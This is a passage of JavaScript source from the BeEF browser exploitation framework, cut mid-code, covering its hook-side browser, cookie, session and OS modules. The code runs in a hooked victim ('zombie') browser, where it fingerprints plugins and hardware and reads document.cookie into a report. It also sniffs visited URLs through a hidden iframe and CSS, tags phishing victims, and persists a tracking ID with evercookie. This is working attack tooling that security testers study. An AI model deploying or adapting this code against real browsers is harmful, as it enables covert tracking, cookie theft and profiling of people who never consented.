                if (window.ActiveXObject != null) {
                    for (x = 2; x <= flash_versions; x++) {
                        try {
                            Flash = eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash." + x + "');");
                            if (Flash) {
                                flash_installed = true;
                            }
                        } catch (e) {
                            beef.debug("Creating Flash ActiveX object failed: " + e.message);
                        }
                    }
                }
            }
            return flash_installed;
        }
    },

    /**
     * Checks if the zombie has the QuickTime plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( beef.browser.hasQuickTime() ) { ... }
     */
    hasQuickTime: function () {

        var quicktime = false;

        if (this.capabilities()["navigator.plugins"]) {

            for (i = 0; i < navigator.plugins.length; i++) {

                if (navigator.plugins[i].name.indexOf("QuickTime") >= 0) {
                    quicktime = true;
                }

            }

            // Has navigator.plugins
        } else {

            try {

                var qt_test = new ActiveXObject('QuickTime.QuickTime');

            } catch (e) {
                beef.debug("Creating QuickTime ActiveX object failed: " + e.message);
            }

            if (qt_test) {
                quicktime = true;
            }

        }

        return quicktime;

    },

    /**
     * Checks if the zombie has the RealPlayer plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( beef.browser.hasRealPlayer() ) { ... }
     */
    hasRealPlayer: function () {

        var realplayer = false;

        if (this.capabilities()["navigator.plugins"]) {


            for (i = 0; i < navigator.plugins.length; i++) {

                if (navigator.plugins[i].name.indexOf("RealPlayer") >= 0) {
                    realplayer = true;
                }

            }

            // has navigator.plugins
        } else {

            var definedControls = [
                'RealPlayer',
                'rmocx.RealPlayer G2 Control',
                'rmocx.RealPlayer G2 Control.1',
                'RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)',
                'RealVideo.RealVideo(tm) ActiveX Control (32-bit)'
            ];

            for (var i = 0; i < definedControls.length; i++) {

                try {
                    var rp_test = new ActiveXObject(definedControls[i]);
                } catch (e) {
                    beef.debug("Creating RealPlayer ActiveX object failed: " + e.message);
                }

                if (rp_test) {
                    realplayer = true;

                }
            }
        }

        return realplayer;

    },

    /**
     * Checks if the zombie has the Windows Media Player plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( beef.browser.hasWMP() ) { ... }
     */
    hasWMP: function () {

        var wmp = false;

        if (this.capabilities()["navigator.plugins"]) {


            for (i = 0; i < navigator.plugins.length; i++) {

                if (navigator.plugins[i].name.indexOf("Windows Media Player") >= 0) {
                    wmp = true;
                }

            }

            // Has navigator.plugins
        } else {

            try {

                var wmp_test = new ActiveXObject('WMPlayer.OCX');

            } catch (e) {
                beef.debug("Creating WMP ActiveX object failed: " + e.message);
            }

            if (wmp_test) {
                wmp = true;
            }

        }

        return wmp;

    },

    /**
     *  Checks if VLC is installed
     *  @return: {Boolean} true or false
     **/
    hasVLC: function () {
        var vlc = false;
        if (!this.type().IE) {
            for (i = 0; i < navigator.plugins.length; i++) {
                if (navigator.plugins[i].name.indexOf("VLC") >= 0) {
                    vlc = true;
                }
            }
        } else {
            try {
                control = new ActiveXObject("VideoLAN.VLCPlugin.2");
                vlc = true;
            } catch (e) {
                beef.debug("Creating VLC ActiveX object failed: " + e.message);
            }
        }
        return vlc;
    },

    /**
     * Checks if the zombie has Java enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.javaEnabled()) { ... }
     */
    javaEnabled: function () {

        return navigator.javaEnabled();

    },

    /**
     * Checks if the Phonegap API is available from the hooked origin.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasPhonegap()) { ... }
     */
    hasPhonegap: function () {
        var result = false;

        try {
            if (!!device.phonegap || !!device.cordova) result = true; else result = false;
        }
        catch (e) {
            result = false;
        }
        return result;
    },

    /**
     * Checks if the browser supports CORS
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasCors()) { ... }
     */
    hasCors: function () {
        if ('withCredentials' in new XMLHttpRequest())
            return true;
        else if (typeof XDomainRequest !== "undefined")
            return true;
        else
            return false;
    },

    /**
     * Checks if the zombie has Java installed and enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasJava()) { ... }
     */
    hasJava: function () {
        if (beef.browser.getPlugins().match(/java/i) && beef.browser.javaEnabled()) {
          return true;
        } else {
          return false;
        }
    },

    /**
     * Checks if the zombie has VBScript enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasVBScript()) { ... }
     */
    hasVBScript: function () {
        if ((navigator.userAgent.indexOf('MSIE') != -1) && (navigator.userAgent.indexOf('Win') != -1)) {
            return true;
        } else {
            return false;
        }
    },

    /**
     * Returns the list of plugins installed in the browser.
     */
    getPlugins: function () {

        var results;
        Array.prototype.unique = function () {
            var o = {}, i, l = this.length, r = [];
            for (i = 0; i < l; i += 1) o[this[i]] = this[i];
            for (i in o) r.push(o[i]);
            return r;
        };

        // Things lacking navigator.plugins
        if (!this.capabilities()["navigator.plugins"]) this.getPluginsIE();

        // All other browsers that support navigator.plugins
        else if (navigator.plugins && navigator.plugins.length > 0) {
            results = new Array();
            for (var i = 0; i < navigator.plugins.length; i++) {

                // Firefox returns exact plugin versions
                if (beef.browser.isFF()) results[i] = navigator.plugins[i].name + '-v.' + navigator.plugins[i].version;

                // Webkit and Presto (Opera)
                // Don't support the version attribute
                // Sometimes store the version in description (Real, Adobe)
                else results[i] = navigator.plugins[i].name;// + '-desc.' + navigator.plugins[i].description;
            }
            results = results.unique().toString();

            // All browsers that don't support navigator.plugins
        } else {
            results = new Array();
            //firefox https://bugzilla.mozilla.org/show_bug.cgi?id=757726
            // On linux sistem the "version" slot is empty so I'll attach "description" after version
            var plugins = {

                'AdobeAcrobat': {
                    'control': 'Adobe Acrobat',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Adobe Acrobat"]["description"];
                            return 'Adobe Acrobat Version  ' + version; //+ " description "+ filename;

                        }
                        catch (e) {
                        }


                    }},
                'Flash': {
                    'control': 'Shockwave Flash',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Shockwave Flash"]["description"];
                            return 'Flash Player Version ' + version; //+ " description "+ filename;
                        }

                        catch (e) {
                        }
                    }},
                'Google_Talk_Plugin_Accelerator': {
                    'control': 'Google Talk Plugin Video Accelerator',
                    'return': function (control) {

                        try {
                            version = navigator.plugins['Google Talk Plugin Video Accelerator']["description"];
                            return 'Google Talk Plugin Video Accelerator Version ' + version; //+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Talk_Plugin': {
                    'control': 'Google Talk Plugin',
                    'return': function (control) {
                        try {
                            version = navigator.plugins['Google Talk Plugin']["description"];
                            return 'Google Talk Plugin Version ' + version;// " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Facebook_Video_Calling_Plugin': {
                    'control': 'Facebook Video Calling Plugin',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Facebook Video Calling Plugin"]["description"];
                            return 'Facebook Video Calling Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Update': {
                    'control': 'Google Update',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Google Update"]["description"];
                            return 'Google Update Version ' + version//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Windows_Activation_Technologies': {
                    'control': 'Windows Activation Technologies',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Windows Activation Technologies"]["description"];
                            return 'Windows Activation Technologies Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }

                    }},
                'VLC_Web_Plugin': {
                    'control': 'VLC Web Plugin',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["VLC Web Plugin"]["description"];
                            return 'VLC Web Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Earth_Plugin': {
                    'control': 'Google Earth Plugin',

                    'return': function (control) {
                        try {
                            version = navigator.plugins['Google Earth Plugin']["description"];
                            return 'Google Earth Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'FoxitReader_Plugin': {
                    'control': 'FoxitReader Plugin',
                    'return': function (control) {
                        try {
                            version = navigator.plugins['Foxit Reader Plugin for Mozilla']['version'];
                            return 'FoxitReader Plugin Version ' + version;
                        } catch (e) {
                        }
                    }}
            };

            var c = 0;
            for (var i in plugins) {
                //each element od plugins
                var control = plugins[i]['control'];
                try {
                    var version = plugins[i]['return'](control);
                    if (version) {
                        results[c] = version;
                        c = c + 1;
                    }
                }
                catch (e) {
                }

            }
        }
        // Return results
        return results;
    },

    /**
     * Returns a list of plugins detected by IE. This is a hack because IE doesn't
     * support navigator.plugins
     */
    getPluginsIE: function () {
        var results = '';
        var plugins = {'AdobePDF6': {
            'control': 'PDF.PdfCtrl',
            'return': function (control) {
                version = control.getVersions().split(',');
                version = version[0].split('=');
                return 'Acrobat Reader v' + parseFloat(version[1]);
            }},
            'AdobePDF7': {
                'control': 'AcroPDF.PDF',
                'return': function (control) {
                    version = control.getVersions().split(',');
                    version = version[0].split('=');
                    return 'Acrobat Reader v' + parseFloat(version[1]);
                }},
            'Flash': {
                'control': 'ShockwaveFlash.ShockwaveFlash',
                'return': function (control) {
                    version = control.getVariable('$version').substring(4);
                    return 'Flash Player v' + version.replace(/,/g, ".");
                }},
            'Quicktime': {
                'control': 'QuickTime.QuickTime',
                'return': function (control) {
                    return 'QuickTime Player';
                }},
            'RealPlayer': {
                'control': 'RealPlayer',
                'return': function (control) {
                    version = control.getVersionInfo();
                    return 'RealPlayer v' + parseFloat(version);
                }},
            'Shockwave': {
                'control': 'SWCtl.SWCtl',
                'return': function (control) {
                    version = control.ShockwaveVersion('').split('r');
                    return 'Shockwave v' + parseFloat(version[0]);
                }},
            'WindowsMediaPlayer': {
                'control': 'WMPlayer.OCX',
                'return': function (control) {
                    return 'Windows Media Player v' + parseFloat(control.versionInfo);
                }},
            'FoxitReaderPlugin': {
                'control': 'FoxitReader.FoxitReaderCtl.1',
                'return': function (control) {
                    return 'Foxit Reader Plugin v' + parseFloat(control.versionInfo);
                }}
        };
        if (window.ActiveXObject) {
            var j = 0;
            for (var i in plugins) {
                var control = null;
                var version = null;
                try {
                    control = new ActiveXObject(plugins[i]['control']);
                } catch (e) {
                }
                if (control) {
                    if (j != 0)
                        results += ', ';
                    results += plugins[i]['return'](control);
                    j++;
                }
            }
        }
        return results;
    },

    /**
     * Returns zombie screen size and color depth.
     */
    getScreenSize: function () {
        return {
            width: window.screen.width,
            height: window.screen.height,
            colordepth: window.screen.colorDepth
        }
    },

    /**
     * Returns zombie browser window size.
     * @from: http://www.howtocreate.co.uk/tutorials/javascript/browserwindow
     */
    getWindowSize: function () {
        var myWidth = 0, myHeight = 0;
        if (typeof( window.innerWidth ) == 'number') {
            // Non-IE
            myWidth = window.innerWidth;
            myHeight = window.innerHeight;
        } else if (document.documentElement && ( document.documentElement.clientWidth || document.documentElement.clientHeight )) {
            // IE 6+ in 'standards compliant mode'
            myWidth = document.documentElement.clientWidth;
            myHeight = document.documentElement.clientHeight;
        } else if (document.body && ( document.body.clientWidth || document.body.clientHeight )) {
            // IE 4 compatible
            myWidth = document.body.clientWidth;
            myHeight = document.body.clientHeight;
        }
        return {
            width: myWidth,
            height: myHeight
        }
    },

    /**
     * Construct hash from browser details. This function is used to grab the browser details during the hooking process
     */
    getDetails: function () {
        var details = new Array();

        var browser_name = beef.browser.getBrowserName();
        var browser_version = beef.browser.getBrowserVersion();
        var browser_reported_name = beef.browser.getBrowserReportedName();
        var browser_language = beef.browser.getBrowserLanguage();
        var page_title = (document.title) ? document.title : "Unknown";
        var page_uri = (document.location.href) ? document.location.href : "Unknown";
        var page_referrer = (document.referrer) ? document.referrer : "Unknown";
        var hostname = (document.location.hostname) ? document.location.hostname : "Unknown";
        switch (document.location.protocol) {
            case "http:":
                var default_port = "80";
                break;
            case "https:":
                var default_port = "443";
                break
            default:
                var default_port = "";
        }
        var hostport = (document.location.port) ? document.location.port : default_port;
        var browser_plugins = beef.browser.getPlugins();
        var date_stamp = new Date().toString();
        var os_name = beef.os.getName();
        var os_version = beef.os.getVersion();
        var default_browser = beef.os.getDefaultBrowser();
        var hw_name = beef.hardware.getName();
        var cpu_type = beef.hardware.cpuType();
        var touch_enabled = (beef.hardware.isTouchEnabled()) ? "Yes" : "No";
        var browser_platform = (typeof(navigator.platform) != "undefined" && navigator.platform != "") ? navigator.platform : null;
        var browser_type = JSON.stringify(beef.browser.type(), function (key, value) {
            if (value == true) return value; else if (typeof value == 'object') return value; else return;
        });
        var screen_size = beef.browser.getScreenSize();
        var window_size = beef.browser.getWindowSize();
        var vbscript_enabled = (beef.browser.hasVBScript()) ? "Yes" : "No";
        var has_flash = (beef.browser.hasFlash()) ? "Yes" : "No";
        var has_phonegap = (beef.browser.hasPhonegap()) ? "Yes" : "No";
        var has_googlegears = (beef.browser.hasGoogleGears()) ? "Yes" : "No";
        var has_web_socket = (beef.browser.hasWebSocket()) ? "Yes" : "No";
        var has_webrtc = (beef.browser.hasWebRTC()) ? "Yes" : "No";
        var has_activex = (beef.browser.hasActiveX()) ? "Yes" : "No";
        var has_quicktime = (beef.browser.hasQuickTime()) ? "Yes" : "No";
        var has_realplayer = (beef.browser.hasRealPlayer()) ? "Yes" : "No";
        var has_wmp = (beef.browser.hasWMP()) ? "Yes" : "No";
        try {
            var cookies = document.cookie;
            var veglol = beef.browser.cookie.veganLol();
            var has_session_cookies = (beef.browser.cookie.hasSessionCookies(veglol)) ? "Yes" : "No";
            var has_persistent_cookies = (beef.browser.cookie.hasPersistentCookies(veglol)) ? "Yes" : "No";
            if (cookies) details['Cookies'] = cookies;
            if (has_session_cookies) details['hasSessionCookies'] = has_session_cookies;
            if (has_persistent_cookies) details['hasPersistentCookies'] = has_persistent_cookies;
        } catch (e) {
            // the hooked origin is using HttpOnly. EverCookie is persisting the BeEF hook in a different way,
            // and there is no reason to read cookies at this point
            details['Cookies'] = "Cookies can't be read. The hooked origin is most probably using HttpOnly.";
            details['hasSessionCookies'] = "No";
            details['hasPersistentCookies'] = "No";
        }

        if (browser_name) details['BrowserName'] = browser_name;
        if (browser_version) details['BrowserVersion'] = browser_version;
        if (browser_reported_name) details['BrowserReportedName'] = browser_reported_name;
        if (browser_language) details['BrowserLanguage'] = browser_language;
        if (page_title) details['PageTitle'] = page_title;
        if (page_uri) details['PageURI'] = page_uri;
        if (page_referrer) details['PageReferrer'] = page_referrer;
        if (hostname) details['HostName'] = hostname;
        if (hostport) details['HostPort'] = hostport;
        if (browser_plugins) details['BrowserPlugins'] = browser_plugins;
        if (os_name) details['OsName'] = os_name;
        if (os_version) details['OsVersion'] = os_version;
        if (default_browser) details['DefaultBrowser'] = default_browser;
        if (hw_name) details['Hardware'] = hw_name;
        if (cpu_type) details['CPU'] = cpu_type;
        if (touch_enabled) details['TouchEnabled'] = touch_enabled;
        if (date_stamp) details['DateStamp'] = date_stamp;
        if (browser_platform) details['BrowserPlatform'] = browser_platform;
        if (browser_type) details['BrowserType'] = browser_type;
        if (screen_size) details['ScreenSize'] = screen_size;
        if (window_size) details['WindowSize'] = window_size;
        if (vbscript_enabled) details['VBScriptEnabled'] = vbscript_enabled;
        if (has_flash) details['HasFlash'] = has_flash;
        if (has_phonegap) details['HasPhonegap'] = has_phonegap;
        if (has_web_socket) details['HasWebSocket'] = has_web_socket;
        if (has_googlegears) details['HasGoogleGears'] = has_googlegears;
        if (has_webrtc) details['HasWebRTC'] = has_webrtc;
        if (has_activex) details['HasActiveX'] = has_activex;
        if (has_quicktime) details['HasQuickTime'] = has_quicktime;
        if (has_realplayer) details['HasRealPlayer'] = has_realplayer;
        if (has_wmp) details['HasWMP'] = has_wmp;

        var pf_integration = "";
        if (pf_integration) {
            var pf_param = "uid";
            var pf_victim_uid = "";
            var location_search = window.location.search.substring(1);
            var params = location_search.split('&');
            for (var i = 0; i < params.length; i++) {
                var param_entry = params[i].split('=');
                if (param_entry[0] == pf_param) {
                    pf_victim_uid = param_entry[1];
                    details['PhishingFrenzyUID'] = pf_victim_uid;
                    break;
                }
            }
        } else {
            details['PhishingFrenzyUID'] = "N/A";
        }

        return details;
    },

    /**
     * Returns boolean value depending on whether the browser supports ActiveX
     */
    hasActiveX: function () {
        return !!window.ActiveXObject;
    },

    /**
     * Returns boolean value depending on whether the browser supports WebRTC
     */
    hasWebRTC: function () {
        return (!!window.mozRTCPeerConnection || !!window.webkitRTCPeerConnection);
    },

    /**
     * Returns boolean value depending on whether the browser supports Silverlight
     */
    hasSilverlight: function () {
        var result = false;

        try {
            if (beef.browser.isIE()) {
                var slControl = new ActiveXObject('AgControl.AgControl');
                result = true;
            } else if (navigator.plugins["Silverlight Plug-In"]) {
                result = true;
            }
        } catch (e) {
            result = false;
        }

        return result;
    },

    /**
     * Returns array of results, whether or not the target zombie has visited the specified URL
     */
    hasVisited: function (urls) {
        var results = new Array();
        var iframe = beef.dom.createInvisibleIframe();
        var ifdoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
        ifdoc.open();
        ifdoc.write('<style>a:visited{width:0px !important;}</style>');
        ifdoc.close();
        urls = urls.split("\n");
        var count = 0;
        for (var i in urls) {
            var u = urls[i];
            if (u != "" || u != null) {
                var success = false;
                var a = ifdoc.createElement('a');
                a.href = u;
                ifdoc.body.appendChild(a);
                var width = null;
                (a.currentStyle) ? width = a.currentStyle['width'] : width = ifdoc.defaultView.getComputedStyle(a, null).getPropertyValue("width");
                if (width == '0px') {
                    success = true;
                }
                results.push({'url': u, 'visited': success});
                count++;
            }
        }
        beef.dom.removeElement(iframe);
        if (results.length == 0) {
            return false;
        }
        return results;
    },

    /**
     * Checks if the zombie has Web Sockets enabled.
     * @return: {Boolean} true or false.
     * In FF6+ the websocket object has been prefixed with Moz, so now it's called MozWebSocket
     * */
    hasWebSocket: function () {
        return !!window.WebSocket || !!window.MozWebSocket;
    },

    /**
     * Checks if the zombie has Google Gears installed.
     * @return: {Boolean} true or false.
     *
     * @from: https://code.google.com/apis/gears/gears_init.js
     * */
    hasGoogleGears: function () {

        var ggfactory = null;

        // Chrome
        if (window.google && google.gears) return true;

        // Firefox
        if (typeof GearsFactory != 'undefined') {
            ggfactory = new GearsFactory();
        } else {
            // IE
            try {
                ggfactory = new ActiveXObject('Gears.Factory');
                // IE Mobile on WinCE.
                if (ggfactory.getBuildInfo().indexOf('ie_mobile') != -1) {
                    ggfactory.privateSetGlobalObject(this);
                }
            } catch (e) {
                // Safari
                if ((typeof navigator.mimeTypes != 'undefined')
                    && navigator.mimeTypes["application/x-googlegears"]) {
                    ggfactory = document.createElement("object");
                    ggfactory.style.display = "none";
                    ggfactory.width = 0;
                    ggfactory.height = 0;
                    ggfactory.type = "application/x-googlegears";
                    document.documentElement.appendChild(ggfactory);
                    if (ggfactory && (typeof ggfactory.create == 'undefined')) ggfactory = null;
                }
            }
        }
        if (!ggfactory) return false; else return true;
    },

    /**
     * Checks if the zombie has Foxit PDF reader plugin.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasFoxit()) { ... }
     * */
    hasFoxit: function () {

        var foxitplugin = false;

        try {
            if (beef.browser.isIE()) {
                var foxitControl = new ActiveXObject('FoxitReader.FoxitReaderCtl.1');
                foxitplugin = true;
            } else if (navigator.plugins['Foxit Reader Plugin for Mozilla']) {
                foxitplugin = true;
            }
        } catch (e) {
            foxitplugin = false;
        }

        return foxitplugin;
    },

    /**
     * Returns the page head HTML
     **/
    getPageHead: function () {
        var html_head;
        try {
            html_head = document.head.innerHTML.toString();
        } catch (e) {
        }
        return html_head;
    },

    /**
     * Returns the page body HTML
     **/
    getPageBody: function () {
        var html_body;
        try {
            html_body = document.body.innerHTML.toString();
        } catch (e) {
        }
        return html_body;
    },

    /**
     * Dynamically changes the favicon: works in Firefox, Chrome and Opera
     **/
    changeFavicon: function (favicon_url) {
        var iframe = null;
        if (this.isC()) {
            iframe = document.createElement('iframe');
            iframe.src = 'about:blank';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
        }
        var link = document.createElement('link'),
            oldLink = document.getElementById('dynamic-favicon');
        link.id = 'dynamic-favicon';
        link.rel = 'shortcut icon';
        link.href = favicon_url;
        if (oldLink) document.head.removeChild(oldLink);
        document.head.appendChild(link);
        if (this.isC()) iframe.src += '';
    },

    /**
     * Changes page title
     **/
    changePageTitle: function (title) {
        document.title = title;
    },

    /**
     * Get the browser language
     */
    getBrowserLanguage: function () {
        var l = 'Unknown';
        try {
            l = window.navigator.userLanguage || window.navigator.language;
        } catch (e) {
        }
        return l;
    },

    /**
     *  A function that gets the max number of simultaneous connections the
     *  browser can make per origin, or globally on all origin.
     *
     *  This code is based on research from browserspy.dk
     *
     * @parameter {ENUM: 'PER_DOMAIN', 'GLOBAL'=>default}
     * @return {Deferred promise} A jQuery deferred object promise, which when resolved passes
     *    the number of connections to the callback function as "this"
     *
     *    example usage:
     *        $j.when(getMaxConnections()).done(function(){
     *            console.debug("Max Connections: " + this);
     *            });
     *
     */
    getMaxConnections: function (scope) {

        var imagesCount = 30;		// Max number of images to test
        var secondsTimeout = 5;		// Image load timeout threashold
        var testUrl = "";		// The image testing service URL

        // User broserspy.dk max connections service URL.
        if (scope == 'PER_DOMAIN')
            testUrl = "http://browserspy.dk/connections.php?img=1&amp;random=";
        else
        // The token will be replaced by a different number with each request (different origin).
            testUrl = "http://<token>.browserspy.dk/connections.php?img=1&amp;random=";

        var imagesLoaded = 0;			// Number of responding images before timeout.
        var imagesRequested = 0;		// Number of requested images.
        var testImages = new Array();		// Array of all images.
        var deferredObject = $j.Deferred();	// A jquery Deferred object.

        for (var i = 1; i <= imagesCount; i++) {
            // Asynchronously request image.
            testImages[i] =
                $j.ajax({
                    type: "get",
                    dataType: true,
                    url: (testUrl.replace("<token>", i)) + Math.random(),
                    data: "",
                    timeout: (secondsTimeout * 1000),

                    // Function on completion of request.
                    complete: function (jqXHR, textStatus) {

                        imagesRequested++;

                        // If the image returns a 200 or a 302, the text Status is "error", else null
                        if (textStatus == "error") {
                            imagesLoaded++;
                        }

                        // If all images requested
                        if (imagesRequested >= imagesCount) {
                            // resolve the deferred object passing the number of loaded images.
                            deferredObject.resolveWith(imagesLoaded);
                        }
                    }
                });

        }

        // Return a promise to resolve the deffered object when the images are loaded.
        return deferredObject.promise();

    }

};

beef.regCmp('beef.browser');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.browser.cookie
 * 
 * Provides fuctions for working with cookies. 
 * Several functions adopted from http://techpatterns.com/downloads/javascript_cookies.php
 * Original author unknown.
 * 
 */
beef.browser.cookie = {
	
		setCookie: function (name, value, expires, path, domain, secure) 
		{
	
			var today = new Date();
			today.setTime( today.getTime() );
	
			if ( expires )
			{
				expires = expires * 1000 * 60 * 60 * 24;
			}
			var expires_date = new Date( today.getTime() + (expires) );
	
			document.cookie = name + "=" +escape( value ) +
				( ( expires ) ? ";expires=" + expires_date.toGMTString() : "" ) +
				( ( path ) ? ";path=" + path : "" ) +
				( ( domain ) ? ";domain=" + domain : "" ) +
				( ( secure ) ? ";secure" : "" );
		},

		getCookie: function(name) 
		{
			var a_all_cookies = document.cookie.split( ';' );
			var a_temp_cookie = '';
			var cookie_name = '';
			var cookie_value = '';
			var b_cookie_found = false;
			
			for ( i = 0; i < a_all_cookies.length; i++ )
			{
				a_temp_cookie = a_all_cookies[i].split( '=' );
				cookie_name = a_temp_cookie[0].replace(/^\s+|\s+$/g, '');
				if ( cookie_name == name )
				{
					b_cookie_found = true;
					if ( a_temp_cookie.length > 1 )
					{
						cookie_value = unescape( a_temp_cookie[1].replace(/^\s+|\s+$/g, '') );
					}
					return cookie_value;
					break;
				}
				a_temp_cookie = null;
				cookie_name = '';
			}
			if ( !b_cookie_found )
			{
				return null;
			}
		},

		deleteCookie: function (name, path, domain) 
		{
			if ( this.getCookie(name) ) document.cookie = name + "=" +
			( ( path ) ? ";path=" + path : "") +
			( ( domain ) ? ";domain=" + domain : "" ) +
			";expires=Thu, 01-Jan-1970 00:00:01 GMT";
		},

		veganLol: function (){
			var to_hell= '';
			var min = 17;
			var max = 25;
			var lol_length = Math.floor(Math.random() * (max - min + 1)) + min;

			var grunt = function(){
				var moo = Math.floor(Math.random() * 62);
				var char = '';
				if(moo < 36){
					char = String.fromCharCode(moo + 55);
				}else{
					char = String.fromCharCode(moo + 61);
				}
				if(char != ';' && char != '='){
					return char;
				}else{
					return 'x';
				}
			};

			while(to_hell.length < lol_length){
				to_hell += grunt();
			}
			return to_hell;
		},
		
		hasSessionCookies: function (name){
			this.setCookie( name, beef.browser.cookie.veganLol(), '', '/', '', '' );

			cookiesEnabled = (this.getCookie(name) == null)? false:true;
			this.deleteCookie(name, '/', '');
			return cookiesEnabled;
			
		},

		hasPersistentCookies: function (name){
			this.setCookie( name, beef.browser.cookie.veganLol(), 1, '/', '', '' );

			cookiesEnabled = (this.getCookie(name) == null)? false:true;
			this.deleteCookie(name, '/', '');
			return cookiesEnabled;
			
		}	
					
};

beef.regCmp('beef.browser.cookie');

//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.browser.popup
 * 
 * Provides fuctions for working with cookies. 
 * Several functions adopted from http://davidwalsh.name/popup-block-javascript
 * Original author unknown.
 * 
 */
beef.browser.popup = {
	
		blocker_enabled: function ()
		{
			screenParams = beef.browser.getScreenSize();
			var popUp = window.open('/', 'windowName0', 'width=1, height=1, left='+screenParams.width+', top='+screenParams.height+', scrollbars, resizable');
			if (popUp == null || typeof(popUp)=='undefined') {   
			  	return true;
			} else {   
				popUp.close();
				return false;
			}
		}
};

beef.regCmp('beef.browser.popup');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.session
 *
 * Provides basic session functions.
 */
beef.session = {
	
	hook_session_id_length: 80,
	hook_session_id_chars: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",	
	ec: new evercookie(),
    beefhook: "BEEFHOOK",
	
	/**
	 * Gets a string which will be used to identify the hooked browser session
	 * 
	 * @example: var hook_session_id = beef.session.get_hook_session_id();
	 */
  	get_hook_session_id: function() {
		// check if the browser is already known to the framework
		var id = this.ec.evercookie_cookie(beef.session.beefhook);
		if (typeof id == 'undefined') {
			var id = this.ec.evercookie_userdata(beef.session.beefhook);
		}
		if (typeof id == 'undefined') {
			var id = this.ec.evercookie_window(beef.session.beefhook);
		}
		
		// if the browser is not known create a hook session id and set it
		if ((typeof id == 'undefined') || (id == null)) {
			id = this.gen_hook_session_id();
			this.set_hook_session_id(id);
		}
		
		// return the hooked browser session identifier
		return id;
	},
	
	/**
	 * Sets a string which will be used to identify the hooked browser session
	 * 
	 * @example: beef.session.set_hook_session_id('RANDOMSTRING');
	 */
  	set_hook_session_id: function(id) {
		// persist the hook session id
		this.ec.evercookie_cookie(beef.session.beefhook, id);
		this.ec.evercookie_userdata(beef.session.beefhook, id);
		this.ec.evercookie_window(beef.session.beefhook, id);
	},
	
	/**
	 * Generates a random string using the chars in hook_session_id_chars.
	 * 
	 * @example: beef.session.gen_hook_session_id();
	 */
  	gen_hook_session_id: function() {
	    // init the return value
		var hook_session_id = "";
		
		// construct the random string 
		for(var i=0; i<this.hook_session_id_length; i++) {
		  var rand_num = Math.floor(Math.random()*this.hook_session_id_chars.length);
		  hook_session_id += this.hook_session_id_chars.charAt(rand_num);
		}
		
		return hook_session_id;
	}
};

beef.regCmp('beef.session');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.os = {

	ua: navigator.userAgent,

	/**
	  * Detect default browser (IE only)
	  * Written by unsticky
	  * http://ha.ckers.org/blog/20070319/detecting-default-browser-in-ie/
	  */
	getDefaultBrowser: function() {
		var result = "Unknown"
		try {
			var mt = document.mimeType;
			if (mt) {
				if (mt == "Safari Document")       result = "Safari";
				if (mt == "Firefox HTML Document") result = "Firefox";
				if (mt == "Chrome HTML Document")  result = "Chrome";
				if (mt == "HTML Document")         result = "Internet Explorer";
				if (mt == "Opera Web Document")    result = "Opera";
			}
		} catch (e) {
			beef.debug("[os] getDefaultBrowser: "+e.message);
		}
		return result;
	},

	// the likelihood that we hook Windows 3.11 (which has only Win in the UA string) is zero in 2015
	isWin311: function() {
		return (this.ua.match('(Win16)')) ? true : false;
	},
	
	isWinNT4: function() {
		return (this.ua.match('(Windows NT 4.0)')) ? true : false;
	},
	
	isWin95: function() {
		return (this.ua.match('(Windows 95)|(Win95)|(Windows_95)')) ? true : false;
	},
	isWinCE: function() {
		return (this.ua.match('(Windows CE)')) ? true : false;
	},
	
	isWin98: function() {
		return (this.ua.match('(Windows 98)|(Win98)')) ? true : false;
	},
	
	isWinME: function() {
		return (this.ua.match('(Windows ME)|(Win 9x 4.90)')) ? true : false;
	},
	
	isWin2000: function() {
		return (this.ua.match('(Windows NT 5.0)|(Windows 2000)')) ? true : false;
	},

	isWin2000SP1: function() {
		return (this.ua.match('Windows NT 5.01 ')) ? true : false;
	},
	
	isWinXP: function() {
		return (this.ua.match('(Windows NT 5.1)|(Windows XP)')) ? true : false;
	},
	
	isWinServer2003: function() {
		return (this.ua.match('(Windows NT 5.2)')) ? true : false;
	},
	
	isWinVista: function() {
		return (this.ua.match('(Windows NT 6.0)')) ? true : false;
	},
	
	isWin7: function() {
